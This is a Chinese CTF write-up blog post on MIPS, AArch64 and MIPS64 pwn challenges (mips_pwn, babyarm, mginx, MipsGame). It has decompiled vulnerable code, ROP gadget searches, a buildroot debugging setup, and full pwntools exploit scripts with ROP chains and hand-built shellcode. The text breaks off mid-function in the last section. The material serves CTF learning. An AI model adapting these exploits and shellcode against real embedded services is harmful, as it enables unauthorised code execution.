---
title: mips_pwn
date: 2020-12-14 10:48:56
tags:
---

# mips/arm杂记

## 前言

总结一下arm/mips栈溢出的基本利用思路及uClibc环境下堆利用的思路。

## 安洵杯-mips_pwn

### 程序逻辑 && 漏洞利用

程序是mips32位-little的程序，拿qemu-mipsel-static启动，libc是拿西湖论剑的libc加载的。IDA不支持mips的反编译，因此我们用Ghidra看一下代码。看到vuln里有个栈溢出，在那之前用printf泄露出栈上残留的memcpy地址，进而泄露libc地址。vuln里栈溢出ROP。

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(void)

{
  undefined auStack32 [24];
  
  alarm(0x3c);
  setbuf(_stdin,(char *)0x0);
  setbuf(_stdout,(char *)0x0);
  memset(auStack32,0,0x14);
  puts("Welcome to MIPS pwn!");
  puts("What\'s your name: ");
  read(0,auStack32,0x14);
  printf("Hello!, %s",auStack32);
  vuln();
  return 0;
}


void vuln(void)

{
  undefined auStack40 [32];
  
  read(0,auStack40,0x200);
  return;
}


```
replace("\n","\r\n").format("A"*344+"B"*10+cyclic(190)+p32(ret_addr)+p32(0x0417aa0))

### 寻找gadgets

遇到的最大困难是寻找rop的gadget，我们希望调用system("/bin/sh")，需要控制a0寄存器，我发现似乎没有很多的lw命令是直接从栈上拷数据到a0-a4的，一般都是拷到s*寄存器，比如拷贝到s0，再使用move指令拷贝到a1寄存器这样，所以我选择使用下面这条指令找到移动到a0的sx寄存器，再找从栈上移动到sx的指令。

```bash
#0x00042648 : move $v0, $zero ; move $a0, $s0 ; move $t9, $s2 ; jalr $t9
#0x00018154 : lw $ra, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra
ROPgadget --binary ./lib/libc.so.0 --only 'lw|jr'  | grep  "s0" | grep "s2" > first
ROPgadget --binary ./lib/libc.so.0 --only 'move|jalr'  | grep  "a0"  > second
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='mips',endian='little',os='linux',log_level="DEBUG")
debug = 2

libc = ELF('./lib/libc.so.0')
if debug == 1:
    p = process(["qemu-mipsel-static", "-L", "/home/wz/Desktop/CTF/axb2019/mips_pwn", "./pwn2"])
elif debug == 2:
    p = process(["qemu-mipsel-static", "-g", "1234", "-L", "/home/wz/Desktop/CTF/axb2019/mips_pwn", "./pwn2"])
else:
    p = remote("183.129.189.61",54403)

def exp():
    raw_input()
    p.recvuntil("What's your name:")
    p.send("a"*0x14)
    p.recvuntil("a"*0x14)
    memcpy_addr = u32(p.recvn(4))
    system_addr = memcpy_addr + (0x767a68f0-0x7677ea60)
    libc_base = system_addr - 0x5f8f0
    binsh = memcpy_addr + (0x00061B80-0x37a60)
    log.success("system addr => " + hex(system_addr))
    log.success("binsh addr => " + hex(binsh))
    #
    #0x00042648 : move $v0, $zero ; move $a0, $s0 ; move $t9, $s2 ; jalr $t9
    #0x00018154 : lw $ra, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra
    gadget1 = libc_base + 0x00018154
    gadget2 = libc_base + 0x00042648
    payload = 'a'*0x24
    payload += p32(gadget1)
    payload += 'b'*0x18
    payload += p32(binsh)+p32(0)+p32(system_addr)
    payload += p32(gadget2)

    p.send(payload)
    p.interactive()

exp()
```




## 骇极杯_2018-babyarm

### 程序逻辑 & 漏洞利用

aarch64的程序，没有开PIE，基础栈溢出。在aarch64架构下，参数寄存器为x0-x7，其中w*为x*的低32位寄存器。调用指令有BL和BLR，BLR指将下一条指令的返回地址放在x30寄存器中。

```c
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  Setbuf();
  write(1, "Name:", 5uLL);
  read(0, &unk_411068, 0x200uLL);
  vuln();
  return 0;
}

ssize_t vuln()
{
  __int64 v1; // [xsp+10h] [xbp+10h]

  return read(0, &v1, 0x200uLL);
}

```
第一次输入时将shellcode写入到bss上，第二次利用rop调用mprotect将bss改为可执行的地址，再跳转到sc执行。这里和mips有点像，也是要寻找将stack数据加载到寄存器的命令，aarch中没有pop指令，替代它的是ldp指令，比如`ldp x19,x20,[sp, #0x10]`就是将rsp+0x10处的16字节分别赋值给x19和x20。而诸如`LDP             X29, X30, [SP+var_s0],#0x40`的指令表示在赋值完毕之后sp的值增加0x40，这就有点类似于pop的指令。
这里通过`ROPGadget --binary ./pwn --only 'ldp|ret'`并没有找到可控x0-x3的gadget，因此这里用arm下的csu来调用mprotect。

如下图所示，溢出之后在栈上有保存main的x29和x30的位置，覆写x30的值到csu_start，加载各种寄存器同时控制x30的值跳转到csu_end，x21为第一次输入的bss地址的某处，保存了mprotect@plt。这里我第一次尝试使用mprotect@got，但是后续会crash，原因不明，修改之后即可。再跳回到csu_start的时候调用保存在x30的sc_addr get shell。

```asm
.text:00000000004008AC loc_4008AC                              ; CODE XREF: gadget+60↓j
.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: gadget+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET
```

### exp.payload

```py
#coding=utf-8
from pwn import *
context.update(arch='aarch64',endian='little',os='linux',log_level="DEBUG")
debug = 2

elf = ELF("./pwn")
libc = ELF('/usr/aarch64-linux-gnu/lib/libc-2.23.so')
if debug == 1:
    p = process(["qemu-aarch64-static", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
elif debug == 2:
    p = process(["qemu-aarch64-static", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    p = remote("node3.buuoj.cn",28946)

def exp():
    raw_input()
    p.recvuntil("Name:")
    sc = asm(shellcraft.sh())
    bss_addr = 0x411068
    csu_start = 0x4008CC
    csu_end = 0x4008AC
    payload = sc.ljust(0x90,'\x00')
    payload += p64(0x400600)

    p.send(payload)
    #

    payload = 'a'*0x40
    payload += p64(bss_addr+0x90)+p64(csu_start)
    rops = flat([
        bss_addr+0x400,csu_end,
        0,1,
        bss_addr+0x90,7,
        0x1000,0x411000
        ])
    payload += rops
    rops1 = flat([
        bss_addr+0x90+0x30+0x30,bss_addr,
        0,0,
        0,0,
        0,0
        ])
    payload += rops1
    sleep(0.02)
    p.send(payload)
    p.interactive()

exp()


```

## RCTF2020-mginx

### mips64环境搭建

由于qemu-user模拟程序总会遇到各种问题，遂决定拿buildroot搭建一套完整的mips64做题环境，这个想法也是受`ruan师傅`一篇博客的启发，由于师傅博客里只标注了几个关键的配置，我自己搭的时候还是踩了不少坑，因此发一份详细的配置及避坑指南。

首先再[官网](https://buildroot.org/download.html)上下载buildroot源码，我这里用的是buildroot-2020.08.1版本。

解压缩之后进入buildroot文件夹，`configs`文件夹下包含了buildroot支持的架构的config默认配置文件。我们执行`make qemu_mips64_malta_defconfig`，即可得到一个`mips64-big-endian`的默认配置文件，同时也是一个最小安装包。

由于做题中我们需要用到gdbserver和ncat，因此需要安装一些其他的工具。以下是比较关键的menuconfig配置选项。

1. Target options已经设置了我们想要的格式，进去查看一下即可![](./1.png)
2. toolchain:需要启动WCHAR支持和c++支持，否则无法安装nmap包;需要跨架构的gdb
![](./2.png)
![](./3.png)
3. System Configuration：原始配置
4. Kernel:这里选择Custon version(内核版本可以查看configs里的qemu_mips64_malta_defconfig)
![](./4.png)
5. Target packages：选择Show packages that are also provided by busybox(否则一些包看不到)。
6. Target packages->debugging:选择dt/fio/gdb/strace
![](./6.png)
7. arget packages->Networking applications:选择netcat/nmap
![](./7.png)

以上是我的配置，如果找不到某项配置可以使用`/`进行搜索。

配置完成之后使用`make -j6`进行编译，编译主要受网络速度影响，建议挂个代理。

编译完了之后在./output/images目录下生成了kernel文件vmlinux、启动脚本start-qemu.sh和文件系统rootfs.ext2。

编辑start-qemu.h，增加端口转发，在末尾加上`-nic user,hostfwd=tcp::3333-:3333,hostfwd=tcp::5555-:5555`，启动之后进去目标目录，使用`ncat -vc "gdbserver 0.0.0.0:5555 ./mginx" -kl 0.0.0.0 3333`启动gdbserver，在外面先拿exp去连`127.0.0.1:3333`，之后使用`gdb-multiarch ./mginx`以及`target remote :5555`附加到进程上，进行调试，下面是调试界面。

btw，经过测试，peda+pwngdb去调试的话很多命令都用不了比如vmmap/stack，pwndbg好一点，最好用的是gef，所以目前我换上了gef的配置。

![](./8.png)

### 程序逻辑

程序模拟了一个http解析处理。拿ghidra看一下逻辑，发现在二次read调用计算sz时使用的sz为用户输入的sz和数据包content长度之和，缺失检查，因此构造包头中`Content-Length: `为0xfff进行栈溢出。

```c

undefined8 main(undefined4 param_1,undefined8 param_2)

{
  undefined4 extraout_v0_hi;
  undefined4 extraout_v0_hi_00;
  undefined4 extraout_v0_hi_01;
  undefined4 extraout_v0_hi_02;
  int iVar1;
  ssize_t sVar2;
  char *__haystack;
  char *__haystack_00;
  char *pcStack4288;
  size_t sStack4280;
  char *pcStack4272;
  undefined4 auStack4240 [2];
  char *pcStack4232;
  char *pcStack4224;
  undefined4 uStack4216;
  char *pcStack4208;
  int iStack4200;
  undefined auStack4192 [28];
  int iStack4164;
  void *pvStack4160;
  char acStack4152 [4104];
  undefined4 uStack48;
  undefined8 uStack40;
  undefined *local_18;
  
  local_18 = &_gp;
  uStack48 = param_1;
  uStack40 = param_2;
  alarm(0x3c);
  iVar1 = chdir("/");
  if (CONCAT44(extraout_v0_hi,iVar1) != 0) {
    perror("chdir");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = setgid(0xffff);
  if (CONCAT44(extraout_v0_hi_00,iVar1) != 0) {
    perror("setgid");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = setuid(0xffff);
  if (CONCAT44(extraout_v0_hi_01,iVar1) != 0) {
    perror("setuid");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  memset(acStack4152,0,0x1000);
LAB_1200018c4:
  do {
    sVar2 = read(0,acStack4152,0x1000);
    if (sVar2 < 1) {
      return 0;
    }
    pcStack4288 = strcasestr(acStack4152,"GET");
    if (pcStack4288 == (char *)0x0) {
      pcStack4288 = strcasestr(acStack4152,"POST");
      if (pcStack4288 == (char *)0x0) goto LAB_1200018c4;
      auStack4240[0] = 1;
      pcStack4288 = pcStack4288 + 4;
    }
    else {
      auStack4240[0] = 0;
      pcStack4288 = pcStack4288 + 3;
    }
    *pcStack4288 = '\0';
    pcStack4224 = pcStack4288 + 1;
    __haystack = strchr(pcStack4224,0x20);
    if (__haystack != (char *)0x0) {
      *__haystack = '\0';
      __haystack = __haystack + 1;
      __haystack_00 = strstr(__haystack,"\r\n");
      if (__haystack != (char *)0x0) {
        *__haystack_00 = '\0';
        uStack4216 = 0;
        __haystack_00 = __haystack_00 + 2;
        pcStack4232 = __haystack;
        __haystack = strstr(__haystack_00,"Connection: ");
        if ((__haystack != (char *)0x0) &&
           (iVar1 = strncasecmp(__haystack + 0xc,"keep-alive",10),
           CONCAT44(extraout_v0_hi_02,iVar1) == 0)) {
          uStack4216 = 1;
        }
        iStack4200 = 0;
        __haystack = strstr(__haystack_00,"Content-Length: ");
        if (((__haystack != (char *)0x0) && (iVar1 = atoi(__haystack + 0x10), 0 < iVar1)) &&
           (iVar1 < 0x1000)) {
          iStack4200 = iVar1;
        }
        __haystack = strstr(__haystack_00,"\r\n\r\n");
        if (__haystack != (char *)0x0) {
          pcStack4208 = __haystack + 4;
          sStack4280 = (sVar2 - ((int)pcStack4208 - ((int)register0x000000e8 + -0x1038))) +
                       iStack4200;
          pcStack4272 = acStack4152 + sVar2;
          while ((sStack4280 != 0 && (sVar2 = read(0,pcStack4272,sStack4280), 0 < sVar2))) {
            pcStack4272 = pcStack4272 + (int)sStack4280;
            sStack4280 = sStack4280 - sVar2;
          }
          parse_req(auStack4240,auStack4192);
          http_sendmsg(auStack4192);
          free(pvStack4160);
          if (iStack4164 == 0) {
            return 0;
          }
        }
      }
    }
  } while( true );
}


```

### 漏洞利用

构造出包的解析规则之后在return的时候劫持控制流，这里有一个问题是`iStack4164 == 0`条件如何成立，ghidra中调试发现`Connection:`字段为`keep-alive`的时候，会设置`uStack4216 = 1`，后面虽然也没找到对这个flag处理的东西，不过到最后`iStack4164`也会被设置为1，因此只要设置`Connection`为`no`即可退出循环，这点根据http包的字段含义也比较好理解。

最后溢出可控ra/fp/gp/sp寄存器的值，寻找gadget无果之后决定进行栈迁移，二次读取shellcode到bss上并跳转执行。

```asm
       120001c94 df bf 10 b8     ld         ra,0x10b8(sp)
       120001c98 df be 10 b0     ld         s8,0x10b0(sp)
       120001c9c df bc 10 a8     ld         gp,0x10a8(sp)
       120001ca0 67 bd 10 c0     daddiu     sp,sp,0x10c0
       120001ca4 03 e0 00 08     jr         ra

```

由于fp可控，因此buf位置可控，我们将其控制到bss上。此外`gp`的值是各种函数寻址的一个依据，调试可以看到其为一个固定值`0x12001a250`，照抄即可。最后经过二次溢出，可以在bss上部署shellcode。

```asm
67 C2 00 88             daddiu  $v0, $fp, 0x10C0+var_1038
24 06 10 00             li      $a2, 0x1000      # nbytes
00 40 28 25             move    $a1, $v0         # buf
00 00 20 25             move    $a0, $zero       # fd
DF 82 81 28             dla     $v0, read
00 40 C8 25             move    $t9, $v0
03 20 F8 09             jalr    $t9 ; read
```

编写shellcode花了很久，主要原因是pwntools似乎没有mips的as，而我无论是拿mips64-linux-as还是buildroot自带的mips64-buildroot-as都只能编译出ELF32的。shell-storm有一个在线的[Online Assembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)，不过有一些指令也识别不出。`radare`的`rasm2`同理。

最后的最后我把uClibc的IDA汇编导出，寻找自己想写的汇编指令，再通过alt+t反查字节码，编写出了shellcode。

系统调用的规则和x86相似，这里在buildroot的lib/include里找到了`unistd_n64.h`(可以直接拿find命令),其中`__NR_Linux`宏的值为十进制`5000`。系统调用的参数寄存器为a0/a1/a2，返回值存储到v0。

另外libc中搜到的syscall都是`syscall 0`，实际中需要的是`syscall 0x40404`，即字节码p32(0x0101010c)。



可以看到最后解析的字节码中t6/t7呢被换成了t2/t3，还是有些差异，不过不影响使用。这里的sw不可换成sd。

![](./9.png)

### exp.py

![](./10.png)

由于发送的payload数量过大，可能数据会有缺失或者粘连，发送间隔需要久一点，需要多试几次。

```py
#coding=utf-8
from pwn import *
context.update(arch='mips64',endian='big',os='linux',log_level="DEBUG")
debug = 0

libc = ELF('./lib/libc.so.0')
if debug == 1:
    p = process(["qemu-mips64-static", "-L", "/home/wz/Desktop/CTF/RCTF/mnginx/player", "./mginx"])
elif debug == 2:
    p = process(["qemu-mips64-static", "-g", "1234", "-L", "/home/wz/Desktop/CTF/RCTF/mnginx/player", "./mginx"])
else:
    p = remote("127.0.0.1",3333)

def exp():
    raw_input()
    payload = "POST /xmzyshypnc"
    payload += "  \r\n"
    payload += "Connection: no"
    payload += "Content-Length: "
    payload += str(0xfff)
    payload += "\r\n\r\n"
    payload = payload.ljust(0xf0,'\x00')
    p.send(payload)
    bss_addr = 0x12001a250
    read_addr = 0x1200018c4
    payload = 'a'*0xf30
    payload += p64(bss_addr)#gp
    payload += p64(0x0000000120012000+0x500-0x88)#fp
    payload += p64(read_addr)#$ra
    payload += p64(0x12345678)#$sp
    payload = payload.ljust(0x10ba,'a')
    raw_input()
    #sleep(4)
    p.send(payload)
    #
    payload = "POST /xmzyshypnc"
    payload += "  \r\n"
    payload += "Connection: no"
    payload += "Content-Length: "
    payload += str(0xfff)
    payload += "\r\n\r\n"
    #payload = payload.ljust(0x40,'\x00')
    #payload += shellcode
    payload = payload.ljust(0xf0,'\x00')
    raw_input()
    #sleep(4)
    p.send(payload)
    #
    #sc = "\x3c\x0d\x2f\x66\x35\xad\x6c\x61\xaf\xad\xff\xf8\x3c\x0d\x67\x00\xaf\xad\xff\xfc\x67\xa4\xff\xf8\x34\x05\xff\xff\x00\xa0\x28\x2a\x34\x02\x13\x8a\x01\x01\x01\x0c"
    #sc += "\x00\x40\x20\x25\x24\x06\x01\x00\x67\xa5\xff\x00\x34\x02\x13\x88\x01\x01\x01\x0c"
    #sc += "\x24\x04\x00\x01\x34\x02\x13\x89\x01\x01\x01\x0c"
    sc = "\x3c\x0e\x2f\x66"#lui     $t6, 0x2f66
    sc += "\x65\xCE\x6c\x61"#daddiu  $t6, 0x6c61
    sc += "\xaf\xae\x00\x20"#sw      $t6, 0x20($sp)
    sc += "\x3c\x0f\x67\x00"#lui     $t7, 0x6700
    sc += "\xaf\xaf\x00\x24"#sw      $t7, 0x24($sp)
    sc += "\x67\xA4\x00\x20"#daddiu  $a0, $sp, 0x20
    sc += "\x00\x00\x28\x25"#move    $a1, $zero
    sc += "\x00\x00\x30\x25"#move    $a2, $zero
    sc += "\x24\x02\x13\x8a"#li      $v0, 5002
    sc += "\x01\x01\x01\x0c"#syscall 0"
    #read
    sc += "\x00\x40\x20\x25"#move    $a0, $v0"
    sc += "\x67\xA5\x00\x30"#daddiu  $a1, $sp, 0x30
    sc += "\x24\x06\x00\x80"#li      $a2, 0x80
    sc += "\x24\x02\x13\x88"#li      $v0, 5000
    sc += "\x01\x01\x01\x0c"#syscall 0"
    #write
    sc += "\x24\x04\x00\x01"#li      $a0, 1
    sc += "\x67\xA5\x00\x30"#daddiu  $a1, $sp, 0x30
    sc += "\x24\x06\x00\x80"#li      $a2, 0x80
    sc += "\x24\x02\x13\x89"#li      $v0, 5001
    sc += "\x01\x01\x01\x0c"#syscall 0"
    #exit
    sc += "\x00\x00\x20\x25"#move    $a0, $zero"
    sc += "\x24\x02\x13\xc2"#li      $v0, 5001
    sc += "\x01\x01\x01\x0c"#syscall 0"

    #shellcode = ""
    #for i in range(len(sc)/4):
    #    sc1 = sc[i*4:i*4+4]
    #    shellcode += sc1[::-1]
    payload = sc
    payload = payload.ljust(0x100,'\x00')
    payload += p64(0x21)*((0xf30-0x100)/8)
    #payload = 'a'*0xf30
    payload += p64(bss_addr)#gp
    payload += p64(0x0000000120012000+0x500-0x88)#fp
    payload += p64(0x00000001200125f0)#$ra
    payload += p64(0x2333)#$sp
    payload = payload.ljust(0x10ba,'a')
    #sleep(4)
    raw_input()
    p.send(payload)
    p.interactive()

exp()
```

## 强网杯2020-MipsGame

### 前言

首先安利一个插件[ida2ghidra](https://github.com/enovella/ida2ghidra-kb)，可以增加数据和代码高亮，进行重命名等IDA常用的操作，代码看起来会简单一点。

### 程序逻辑 && 漏洞利用

程序模拟了一个httpd，accept_request函数中接收类http请求，需要花一些时间理清合法的header结构，在`handle`函数中，会对请求做响应。

```c

void accept_request(void)

{
  undefined4 extraout_v0_hi;
  undefined4 extraout_v0_hi_00;
  undefined4 extraout_v0_hi_01;
  undefined4 extraout_v0_hi_02;
  undefined4 extraout_v0_hi_03;
  undefined4 extraout_v0_hi_04;
  undefined4 extraout_v0_hi_05;
  undefined4 extraout_v0_hi_06;
  undefined4 extraout_v0_hi_07;
  int is_GET;
  int iVar1;
  size_t sVar3;
  size_t sVar2;
  ulonglong data_len;
  ulonglong idx;
  ulonglong idx1;
  char *idx_after_ask_token;
  char input_data [1024];
  char first_filter_data [256];
  char second_filter_data [255];
  char oncat_str [9];
  char acStack736 [504];
  stat asStack232 [2];
  undefined *local_18;
  bool find_ask_token;
  
  idx_after_ask_token = (char *)0x0;
  data_len = get_line(input_data,0x400);
  idx = 0;
  while (((*(ushort *)(__ctype_b + (longlong)input_data[idx] * 2) & 0x20) == 0 && (idx < 0xfe))) {
    first_filter_data[idx] = input_data[idx];
    idx = idx + 1;
  }
                    /* strip space */
  idx1 = idx;
  first_filter_data[idx] = '\0';
  is_GET = strcasecmp(first_filter_data,"GET");
  if ((CONCAT44(extraout_v0_hi,is_GET) == 0) ||
     (iVar1 = strcasecmp(first_filter_data,"POST"), CONCAT44(extraout_v0_hi_00,iVar1) == 0)) {
    iVar1 = strcasecmp(first_filter_data,"POST");
    find_ask_token = CONCAT44(extraout_v0_hi_01,iVar1) == 0;
    idx = 0;
    while (((*(ushort *)(__ctype_b + (longlong)input_data[idx1] * 2) & 0x20) != 0 &&
           (idx1 < data_len))) {
                    /* filter the space to copy  */
      idx1 = idx1 + 1;
    }
    while ((((*(ushort *)(__ctype_b + (longlong)input_data[idx1] * 2) & 0x20) == 0 && (idx < 0xfe))
           && (idx1 < data_len))) {
      second_filter_data[idx] = input_data[idx1];
      idx = idx + 1;
      idx1 = idx1 + 1;
    }
    second_filter_data[idx] = '\0';
    iVar1 = strcasecmp(first_filter_data,"GET");
    if (CONCAT44(extraout_v0_hi_02,iVar1) == 0) {
      idx_after_ask_token = second_filter_data;
      while ((*idx_after_ask_token != '?' && (*idx_after_ask_token != '\0'))) {
        idx_after_ask_token = idx_after_ask_token + 1;
      }
      if (*idx_after_ask_token == '?') {
        find_ask_token = true;
        *idx_after_ask_token = '\0';
        idx_after_ask_token = idx_after_ask_token + 1;
      }
    }
    sprintf(oncat_str + 1,"htdocs%s",second_filter_data);
    sVar3 = strlen(oncat_str + 1);
    if (oncat_str[CONCAT44(extraout_v0_hi_03,sVar3)] == '/') {
      sVar2 = strlen(oncat_str + 1);
      _extraout_v0_hi_04 = CONCAT44(extraout_v0_hi_04,sVar2);
      *(undefined8 *)(oncat_str + _extraout_v0_hi_04 + 1) = 0x696e6465782e6874;
      acStack736[_extraout_v0_hi_04] = 'm';
      acStack736[_extraout_v0_hi_04 + 1] = 'l';
      acStack736[_extraout_v0_hi_04 + 2] = '\0';
    }
    iVar1 = stat(oncat_str + 1,asStack232);
    if (CONCAT44(extraout_v0_hi_05,iVar1) == -1) {
      while ((data_len != 0 &&
             (iVar1 = strcmp("\n",input_data), CONCAT44(extraout_v0_hi_06,iVar1) != 0))) {
        data_len = get_line(input_data,0x400);
      }
      not_found();
    }
    else {
      if ((asStack232[0].__pad0 & 0xf000U) == 0x4000) {
        sVar2 = strlen(oncat_str + 1);
        _extraout_v0_hi_07 = CONCAT44(extraout_v0_hi_07,sVar2);
        *(undefined8 *)(oncat_str + _extraout_v0_hi_07 + 1) = 0x2f696e6465782e68;
        acStack736[_extraout_v0_hi_07] = 't';
        acStack736[_extraout_v0_hi_07 + 1] = 'm';
        acStack736[_extraout_v0_hi_07 + 2] = 'l';
        acStack736[_extraout_v0_hi_07 + 3] = '\0';
      }
      if (find_ask_token) {
        handle(oncat_str + 1,first_filter_data,idx_after_ask_token);
      }
      else {
        serve_file(oncat_str + 1);
      }
    }
  }
  else {
    unimplemented();
  }
  return;
}


```

handle函数中有一些堆菜单题的基本操作，包括`Add/Show/Del`。首先关注的就是这里的数据输入是使用strcpy进行赋值，气氛上可以off-by-null，不过测试之后发现并不可以，于是找了下别的洞，发现error_request函数中可以拷贝至多0x400数据至info，而Info在init函数中是通过`malloc(0x200)`赋值的，因而存在堆溢出。

```c

int init(EVP_PKEY_CTX *ctx)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  alarm(0x3c);
  tmp = malloc(0x250);
  info = malloc(0x200);
  return 0x1143b0;
}


//
void error_request(void *param_1,size_t param_2)

{
  char *__s;
  size_t __n;
  
  __s = info;
  memset(info,0,0x200);
  sprintf(__s,"HTTP/1.0 400 ERROR REQUEST\r\n");
  __n = strlen(__s);
  write(1,__s,__n);
  sprintf(__s,"Server: QWBhttpd/1.1.0\r\n");
  __n = strlen(__s);
  write(1,__s,__n);
  sprintf(__s,"Content-Length: %d\r\n",param_2 + 0x2f);
  __n = strlen(__s);
  write(1,__s,__n);
  sprintf(__s,"Content-type: text/html\r\n");
  __n = strlen(__s);
  write(1,__s,__n);
  sprintf(__s,"\r\n");
  __n = strlen(__s);
  write(1,__s,__n);
  sprintf(__s,"<P>Your browser sent a error Content-Length: ");
  __n = strlen(__s);
  write(1,__s,__n);
  memcpy(__s,param_1,param_2);
  write(1,__s,param_2);
  sprintf(__s,"\r\n");
  __n = strlen(__s);
  write(1,__s,__n);
  return;
}


```

```c

/* WARNING: Could not reconcile some variable overlaps */

void handle(undefined8 param_1,char *param_2,char *param_3)

{
  bool bVar1;
  undefined4 extraout_v0_hi;
  undefined4 extraout_v0_hi_00;
  undefined4 extraout_v0_hi_01;
  undefined4 extraout_v0_hi_02;
  undefined4 extraout_v0_hi_03;
  undefined4 extraout_v0_hi_04;
  undefined4 extraout_v0_hi_05;
  undefined4 extraout_v0_hi_06;
  undefined4 extraout_v0_hi_07;
  int idx;
  char *pcVar2;
  size_t __n;
  int iVar3;
  void *__buf;
  uint uStack1152;
  uint uStack1148;
  int post_data;
  size_t new_sz;
  int iStack1136;
  undefined8 input_data;
  ulonglong uStack1112;
  ulonglong sz_buf;
  char cStack1096;
  char acStack96 [16];
  char idx_buf [16];
  undefined8 arg1;
  char *arg2;
  char *arg3;
  undefined *local_18;
  
  local_18 = &_gp_1;
  post_data = 1;
  new_sz = 0xffffffff;
  iStack1136 = -1;
  input_data._1_7_ = input_data._1_7_ & 0xffffffffffff;
  input_data = CONCAT17(0x41,input_data._1_7_);
  arg1 = param_1;
  arg2 = param_2;
  arg3 = param_3;
  idx = strcasecmp(param_2,"GET");
  if (CONCAT44(extraout_v0_hi,idx) == 0) {
    while ((0 < post_data &&
           (idx = strcmp("\n",(char *)&input_data), CONCAT44(extraout_v0_hi_00,idx) != 0))) {
      post_data = get_line(&input_data,0x400);
    }
    pcVar2 = strchr(arg3,0x3d);
    if (pcVar2 == (char *)0x0) {
      bad_request();
    }
    else {
      uStack1152 = 0;
      uStack1148 = 0;
      bVar1 = false;
      memset(acStack96,0,10);
      memset(idx_buf,0,10);
      while ((((*(ushort *)(__ctype_b + (longlong)arg3[(int)uStack1148] * 2) & 0x20) == 0 &&
              (uStack1152 < 9)) && ((uStack1152 < 9 && (__n = strlen(arg3), uStack1148 < __n))))) {
        if (bVar1) {
          idx_buf[(int)uStack1152] = arg3[(int)uStack1148];
          uStack1152 = uStack1152 + 1;
          uStack1148 = uStack1148 + 1;
        }
        else {
          if (arg3[(int)uStack1148] == '=') {
            acStack96[(int)uStack1152] = '\0';
            bVar1 = true;
            uStack1152 = 0;
            uStack1148 = uStack1148 + 1;
          }
        }
        if (!bVar1) {
          acStack96[(int)uStack1152] = arg3[(int)uStack1148];
          uStack1152 = uStack1152 + 1;
          uStack1148 = uStack1148 + 1;
        }
      }
      idx_buf[(int)uStack1152] = '\0';
      idx = atoi(idx_buf);
      if ((idx < 0) || (0xf < idx)) {
        bad_request();
      }
      else {
        iVar3 = strcmp(acStack96,"Show");
        if ((CONCAT44(extraout_v0_hi_01,iVar3) == 0) && (show_time == 0)) {
          show_time = 1;
          if ((*(longlong *)(list + (longlong)idx * 0x10) == 0) ||
             (*(int *)(list + (longlong)idx * 0x10 + 8) < 1)) {
            bad_request();
          }
          else {
            input_data = 0x485454502f312e30;
            uStack1112 = 0x20323030204f4b0d;
            sz_buf = sz_buf & 0xffffffffffff | 0xa00000000000000;
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            input_data = 0x5365727665723a20;
            uStack1112 = 0x5157426874747064;
            sz_buf = 0x2f312e312e300d0a;
            cStack1096 = '\0';
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            sprintf((char *)&input_data,"Connection: Keep-Alive\r\n");
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            __n = strlen(*(char **)(list + (longlong)idx * 0x10));
            sprintf((char *)&input_data,"Content-Length: %d\r\n",CONCAT44(extraout_v0_hi_02,__n));
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            sprintf((char *)&input_data,"Content-Type: text/html\r\n");
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            input_data._2_6_ = input_data._2_6_ & 0xffffffffff;
            input_data = CONCAT26(0xd0a,input_data._2_6_);
            __n = strlen((char *)&input_data);
            write(1,&input_data,__n);
            __buf = *(void **)(list + (longlong)idx * 0x10);
            __n = strlen(*(char **)(list + (longlong)idx * 0x10));
            write(1,__buf,__n);
          }
        }
        else {
          iVar3 = strcmp(acStack96,"Del");
          if (CONCAT44(extraout_v0_hi_03,iVar3) == 0) {
            if (*(longlong *)(list + (longlong)idx * 0x10) == 0) {
              bad_request();
            }
            else {
              free(*(void **)(list + (longlong)idx * 0x10));
              *(undefined8 *)(list + (longlong)idx * 0x10) = 0;
              *(undefined4 *)(list + (longlong)idx * 0x10 + 8) = 0;
              success();
            }
          }
          else {
            bad_request();
          }
        }
      }
    }
  }
  else {
    idx = strcasecmp(arg2,"POST");
    if (CONCAT44(extraout_v0_hi_04,idx) == 0) {
      post_data = get_line(&input_data,0x400);
      while ((0 < post_data &&
             (idx = strcmp("\n",(char *)&input_data), CONCAT44(extraout_v0_hi_07,idx) != 0))) {
        uStack1112 = uStack1112 & 0xffffffffffffff00;
        idx = strcasecmp((char *)&input_data,"Content-Length:");
        if ((CONCAT44(extraout_v0_hi_05,idx) == 0) &&
           (new_sz = atoi((char *)&sz_buf), (int)new_sz < 0)) {
                    /* vuln here */
          error_request(&sz_buf,post_data + -0x11);
          return;
        }
        idx = strcasecmp((char *)&input_data,"Content-Indexx:");
